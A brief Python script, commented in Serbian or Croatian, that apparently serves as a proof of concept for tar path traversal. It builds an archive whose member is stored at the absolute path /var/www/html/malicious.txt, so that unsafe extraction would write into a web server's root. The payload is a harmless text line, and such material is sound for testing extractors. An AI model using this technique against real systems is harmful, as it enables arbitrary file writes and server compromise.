import tarfile
import os

# Kreiranje direktorijuma i fajla za maliciozni tar
os.makedirs('malicious/var/www/html', exist_ok=True)
with open('malicious/var/www/html/malicious.txt', 'w') as f:
    f.write('This is a malicious file')

# Kreiranje tar arhive sa apsolutnom putanjom
with tarfile.open('malicious.tar', 'w') as tar:
    tar.add('malicious/var/www/html/malicious.txt', arcname='/var/www/html/malicious.txt')


if __name__ == '__main__':
    pass